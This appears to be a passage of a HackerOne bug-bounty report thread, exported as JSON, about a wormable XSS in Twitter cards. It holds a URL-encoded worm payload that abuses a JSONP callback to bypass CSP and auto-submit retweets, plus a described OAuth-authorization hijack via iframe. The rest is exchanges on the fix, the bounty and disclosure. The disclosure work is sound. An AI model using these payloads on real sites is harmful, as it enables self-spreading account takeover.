class=\"s\"\u003e__twttr\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e/intent/retweet?tweet_id=1114986988128624640\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e//syndication.twimg.com/timeline/profile?callback=__twttr/alert;user_id=12\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e//syndication.twimg.com/timeline/profile?callback=__twttr/frames[0].retweet_btn_form.submit;user_id=12\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe following is an exploit that would\u0026#39;ve leveraged this XSS issue alongside the CSP bypass in order to create the XSS worm:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://twitter.com/messages/compose?recipient_id=988260476659404801\u0026amp;welcome_message_id=988274596427304964\u0026amp;text=%3C%3Cx%3E/script%3E%3C%3Cx%3Eiframe%20id%3D__twttr%20src%3D/intent/retweet%3Ftweet_id%3D1114986988128624640%3E%3C%3Cx%3E/iframe%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/alert%3Buser_id%3D12%3E%3C%3Cx%3E/script%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/frames%5B0%5D.retweet_btn_form.submit%3Buser_id%3D12%3E\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNote: You can verify the CSP bypass by heading to \u0026quot;\u003ca title=\"https://twitter.com/i/cards/tfw/v1/1114986988128624640\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fi%2Fcards%2Ftfw%2Fv1%2F1114986988128624640\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/i/cards/tfw/v1/1114986988128624640\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot; and executing this in the browser console (while logged in—tested on latest Chrome):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerHTML\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\\/\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf you would like to fix the CSP bypass in order to mitigate the risk of such issues in the future, I might consider delaying the publication of my full write-up until then.\u003c/p\u003e\n\n\u003cp\u003eLet me know what you think,\u003cbr\u003e\nThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-07T20:56:09.855Z","updated_at":"2019-04-07T21:06:26.536Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4548536,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nIf you'd like to take a look at the write-up before it's published publicly, you can read it at:\nhttps://gist.github.com/0xSobky/f97a4ce21d5cee9c78d83a53e59e1ab2\n\nLet me know if you've any comments.\nCheers!","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eIf you\u0026#39;d like to take a look at the write-up before it\u0026#39;s published publicly, you can read it at:\u003cbr\u003e\n\u003ca title=\"https://gist.github.com/0xSobky/f97a4ce21d5cee9c78d83a53e59e1ab2\" href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2F0xSobky%2Ff97a4ce21d5cee9c78d83a53e59e1ab2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gist.github.com/0xSobky/f97a4ce21d5cee9c78d83a53e59e1ab2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eLet me know if you\u0026#39;ve any comments.\u003cbr\u003e\nCheers!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-12T15:29:38.413Z","updated_at":"2019-04-12T15:29:38.413Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4548818,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@0xsobky please request public disclosure through this ticket, thank you!","markdown_message":"\u003cp\u003e\u003ca href=\"/0xsobky\"\u003e@0xsobky\u003c/a\u003e please request public disclosure through this ticket, thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-12T16:27:38.581Z","updated_at":"2019-04-12T16:27:38.581Z","actor":{"username":"acamacho","cleared":false,"url":"/acamacho","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4567892,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi 0xsobky,\n\nThat's a nice discovery. Let me see if we can do something about filtering that callback URL better. ","markdown_message":"\u003cp\u003eHi 0xsobky,\u003c/p\u003e\n\n\u003cp\u003eThat\u0026#39;s a nice discovery. Let me see if we can do something about filtering that callback URL better. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-15T21:45:34.915Z","updated_at":"2019-04-15T21:45:34.915Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4587011,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @andrewsorensen,\n\nI think the impact of this issue is even more severe than originally thought. An attacker could have exploited this issue to force a user to authorize any malicious app to access the user's account with full permissions. This is simply possible by loading the following endpoint `https://twitter.com/oauth/authorize?oauth_token=1YBDSQAAAAAA4_EbAAABaiyr63w` in an iframe element and then automatically submitting the form with the ID \"oauth_form\" within that page.\n\nAnd this would not have required any user interaction whatsoever. The only caveat is that the \"oauth_token\" value is valid for one use only and has a relatively short expiry time. But this is not much of a problem as this XSS would get triggered as soon as the malicious tweet loads on any user's timeline, and an attacker could post (and propagate) as many tweets as needed to compromise any number of accounts. \n\nI've put together an example exploit for this kind of attack in the following tweet (which attempts to load two other Twitter cards with additional payloads to silently execute such attack):\nhttps://twitter.com/kyoko6516713624/status/1118609831814934528\n\nYou could still verify this possibility even though the XSS has been fixed. That being said, I think this XSS issue affects a critical part of the app and should probably have been rewarded higher than the typical reward (for reference, this is obviously more severe than #85624).\n\nLet me know if it'd be possible to reassess the impact of this issue in light of this new information.\nThanks!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/andrewsorensen\"\u003e@andrewsorensen\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI think the impact of this issue is even more severe than originally thought. An attacker could have exploited this issue to force a user to authorize any malicious app to access the user\u0026#39;s account with full permissions. This is simply possible by loading the following endpoint \u003ccode\u003ehttps://twitter.com/oauth/authorize?oauth_token=1YBDSQAAAAAA4_EbAAABaiyr63w\u003c/code\u003e in an iframe element and then automatically submitting the form with the ID \u0026quot;oauth_form\u0026quot; within that page.\u003c/p\u003e\n\n\u003cp\u003eAnd this would not have required any user interaction whatsoever. The only caveat is that the \u0026quot;oauth_token\u0026quot; value is valid for one use only and has a relatively short expiry time. But this is not much of a problem as this XSS would get triggered as soon as the malicious tweet loads on any user\u0026#39;s timeline, and an attacker could post (and propagate) as many tweets as needed to compromise any number of accounts. \u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve put together an example exploit for this kind of attack in the following tweet (which attempts to load two other Twitter cards with additional payloads to silently execute such attack):\u003cbr\u003e\n\u003ca title=\"https://twitter.com/kyoko6516713624/status/1118609831814934528\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fkyoko6516713624%2Fstatus%2F1118609831814934528\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/kyoko6516713624/status/1118609831814934528\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eYou could still verify this possibility even though the XSS has been fixed. That being said, I think this XSS issue affects a critical part of the app and should probably have been rewarded higher than the typical reward (for reference, this is obviously more severe than \u003ca href=\"/reports/85624\"\u003e#85624\u003c/a\u003e).\u003c/p\u003e\n\n\u003cp\u003eLet me know if it\u0026#39;d be possible to reassess the impact of this issue in light of this new information.\u003cbr\u003e\nThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-17T21:00:12.099Z","updated_at":"2019-04-17T21:02:14.896Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4588357,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, for what it's worth, I made a few attempts to bypass the fix currently implemented. It seems that injecting the following HTML tag `\u003c!--\u003cscript\u003etest` causes a parsing problem and the Twitter card fails to render correctly:\nhttps://twitter.com/i/cards/tfw/v1/1118704859593814017 (original tweet: https://twitter.com/kyoko6516713624/status/1118704859593814017)\n\nThe reason this happens is well documented at: https://www.w3.org/TR/2014/REC-html5-20141028/scripting-1.html#restrictions-for-contents-of-script-elements","markdown_message":"\u003cp\u003eAlso, for what it\u0026#39;s worth, I made a few attempts to bypass the fix currently implemented. It seems that injecting the following HTML tag \u003ccode\u003e\u0026lt;!--\u0026lt;script\u0026gt;test\u003c/code\u003e causes a parsing problem and the Twitter card fails to render correctly:\u003cbr\u003e\n\u003ca title=\"https://twitter.com/i/cards/tfw/v1/1118704859593814017\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fi%2Fcards%2Ftfw%2Fv1%2F1118704859593814017\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/i/cards/tfw/v1/1118704859593814017\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (original tweet: \u003ca title=\"https://twitter.com/kyoko6516713624/status/1118704859593814017\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fkyoko6516713624%2Fstatus%2F1118704859593814017\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/kyoko6516713624/status/1118704859593814017\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003cp\u003eThe reason this happens is well documented at: \u003ca title=\"https://www.w3.org/TR/2014/REC-html5-20141028/scripting-1.html#restrictions-for-contents-of-script-elements\" href=\"/redirect?url=https%3A%2F%2Fwww.w3.org%2FTR%2F2014%2FREC-html5-20141028%2Fscripting-1.html%23restrictions-for-contents-of-script-elements\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.w3.org/TR/2014/REC-html5-20141028/scripting-1.html#restrictions-for-contents-of-script-elements\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-18T02:44:57.797Z","updated_at":"2019-04-18T02:47:08.365Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4714548,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Requesting public disclosure as the write-up has already been publicly published at:\nhttps://www.virtuesecurity.com/tale-of-a-wormable-twitter-xss/","markdown_message":"\u003cp\u003eRequesting public disclosure as the write-up has already been publicly published at:\u003cbr\u003e\n\u003ca title=\"https://www.virtuesecurity.com/tale-of-a-wormable-twitter-xss/\" href=\"/redirect?url=https%3A%2F%2Fwww.virtuesecurity.com%2Ftale-of-a-wormable-twitter-xss%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.virtuesecurity.com/tale-of-a-wormable-twitter-xss/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-02T15:21:33.353Z","updated_at":"2019-05-02T15:21:33.353Z","first_to_agree":true,"actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4762990,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Twitter has been a good program to participate in so far, but being unresponsive in this case is very frustrating and really disappointing! I only have two inquiries which I hope you'll respond to:\n\n1. Given the impact I've demonstrated so far, the bounty payout awarded is unreasonably low (previous issues with less impact were rewarded much higher—e.g., https://hackerone.com/reports/85624). So would it be possible to reconsider (or justify) the bounty decision on this issue please?\n\n2. Would it be possible to accept the public disclosure request on this ticket too, please?\n\nThank you!\nCC: @andrewsorensen, @acamacho","markdown_message":"\u003cp\u003eTwitter has been a good program to participate in so far, but being unresponsive in this case is very frustrating and really disappointing! I only have two inquiries which I hope you\u0026#39;ll respond to:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eGiven the impact I\u0026#39;ve demonstrated so far, the bounty payout awarded is unreasonably low (previous issues with less impact were rewarded much higher—e.g., \u003ca title=\"https://hackerone.com/reports/85624\" href=\"https://hackerone.com/reports/85624\"\u003ehttps://hackerone.com/reports/85624\u003c/a\u003e). So would it be possible to reconsider (or justify) the bounty decision on this issue please?\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eWould it be possible to accept the public disclosure request on this ticket too, please?\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThank you!\u003cbr\u003e\nCC: \u003ca href=\"/andrewsorensen\"\u003e@andrewsorensen\u003c/a\u003e, \u003ca href=\"/acamacho\"\u003e@acamacho\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-07T07:14:11.734Z","updated_at":"2019-05-07T07:14:11.734Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4769944,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @0xsobky,\n\nWe can't continually review reports that are in the closed state. In this case, this report has been closed out for a year, so it's rather late to bring additional impact to our attention. We don't typically revise bounties unless substantial discoveries are made, and our rubrics for determining payouts have been revised since the time of this report. We have received your request to disclose your report and are working on it, although we've noticed that you have already disclose this report prior to disclosure being accepted. In the future we would appreciate if you could wait until we have approved public disclosure as it gives us a change to make sure any sensitive information (such as your cookies, headers, etc.) has been removed from the report.\n\nThanks for thinking of Twitter security!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/0xsobky\"\u003e@0xsobky\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe can\u0026#39;t continually review reports that are in the closed state. In this case, this report has been closed out for a year, so it\u0026#39;s rather late to bring additional impact to our attention. We don\u0026#39;t typically revise bounties unless substantial discoveries are made, and our rubrics for determining payouts have been revised since the time of this report. We have received your request to disclose your report and are working on it, although we\u0026#39;ve noticed that you have already disclose this report prior to disclosure being accepted. In the future we would appreciate if you could wait until we have approved public disclosure as it gives us a change to make sure any sensitive information (such as your cookies, headers, etc.) has been removed from the report.\u003c/p\u003e\n\n\u003cp\u003eThanks for thinking of Twitter security!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-07T18:57:25.094Z","updated_at":"2019-05-07T18:57:25.094Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4770241,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @andrewsorensen,\n\nThank you for your response. Although I understand your point, it's not always feasible that the impact of an issue is fully known prior to it being fixed/rewarded/closed (especially with very challenging issues like this one). The priority is to patch vulnerabilities before they're exploited, so it's reasonable to report bugs before the full impact has been determined and to issue rewards based on the highest potential impact. That said, I still believe this should not have been rewarded like any typical XSS issue at the time as it affected a very critical/core component of the app.\n\nRegards!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/andrewsorensen\"\u003e@andrewsorensen\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your response. Although I understand your point, it\u0026#39;s not always feasible that the impact of an issue is fully known prior to it being fixed/rewarded/closed (especially with very challenging issues like this one). The priority is to patch vulnerabilities before they\u0026#39;re exploited, so it\u0026#39;s reasonable to report bugs before the full impact has been determined and to issue rewards based on the highest potential impact. That said, I still believe this should not have been rewarded like any typical XSS issue at the time as it affected a very critical/core component of the app.\u003c/p\u003e\n\n\u003cp\u003eRegards!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-07T19:59:24.087Z","updated_at":"2019-05-07T20:05:48.139Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4770912,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @0xsobky,\n\nI completely understand that the impact of an issue might not be known until after the resolution of an issue. The challenge is that an entire year has elapsed since we accepted and rewarded this issue, which makes it difficult for us to revisit that payout decision (which is already something we only do a very select basis).","markdown_message":"\u003cp\u003eHi \u003ca href=\"/0xsobky\"\u003e@0xsobky\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI completely understand that the impact of an issue might not be known until after the resolution of an issue. The challenge is that an entire year has elapsed since we accepted and rewarded this issue, which makes it difficult for us to revisit that payout decision (which is already something we only do a very select basis).\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-07T21:54:43.586Z","updated_at":"2019-05-07T21:54:43.586Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4771184,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @0xsobky,\nI've notified everyone and just giving you a heads up that we're set to disclose this report Thurs. (May 9) morning at 11am Pacific.\n\nPS - this was a great find, thank you!  ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/0xsobky\"\u003e@0xsobky\u003c/a\u003e,\u003cbr\u003e\nI\u0026#39;ve notified everyone and just giving you a heads up that we\u0026#39;re set to disclose this report Thurs. (May 9) morning at 11am Pacific.\u003c/p\u003e\n\n\u003cp\u003ePS - this was a great find, thank you!  \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-07T23:48:36.219Z","updated_at":"2019-05-07T23:48:36.219Z","actor":{"username":"jwaddle","cleared":false,"url":"/jwaddle","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4793905,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for following up on this matter! When it comes to revisiting the payout decision in such case, I agree it'd prove rather challenging and fully understand your point of view. Yet at the same time, I also think this is nothing short of an exceptional case all things considered (complexity, impact/damage potential, time \u0026 effort spent bypassing restrictions, etc.)—this is quite as bad as an XSS could ever get. So it'd be much appreciated if you would reconsider (even though the timing was rather unfortunate)....","markdown_message":"\u003cp\u003eThanks for following up on this matter! When it comes to revisiting the payout decision in such case, I agree it\u0026#39;d prove rather challenging and fully understand your point of view. Yet at the same time, I also think this is nothing short of an exceptional case all things considered (complexity, impact/damage potential, time \u0026amp; effort spent bypassing restrictions, etc.)—this is quite as bad as an XSS could ever get. So it\u0026#39;d be much appreciated if you would reconsider (even though the timing was rather unfortunate)....\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-09T11:45:12.571Z","updated_at":"2019-05-09T11:49:07.879Z","actor":{"username":"0xsobky","cleared":false,"url":"/0xsobky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/KUci7XnpJPBx2BXVZpjgovzZ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4802329,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-09T18:03:28.530Z","updated_at":"2019-05-09T18:03:28.530Z","actor":{"username":"jwaddle","cleared":false,"url":"/jwaddle","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4802330,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-09T18:03:28.618Z","updated_at":"2019-05-09T18:03:28.618Z","actor":{"username":"jwaddle","cleared":false,"url":"/jwaddle","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}